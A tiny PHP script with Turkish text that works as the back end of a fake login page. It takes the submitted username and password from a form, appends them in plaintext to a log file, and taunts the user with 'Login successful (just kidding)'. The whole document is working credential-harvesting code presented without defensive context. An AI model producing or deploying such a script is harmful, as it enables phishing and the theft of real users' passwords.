<?php
$veri = "Kullanıcı: " . $_POST["kullanici"] . " | Şifre: " . $_POST["sifre"] . "\n";
file_put_contents("log.txt", $veri, FILE_APPEND);
echo "Giriş başarılı (şaka yapıyoruz 😄)";
?>
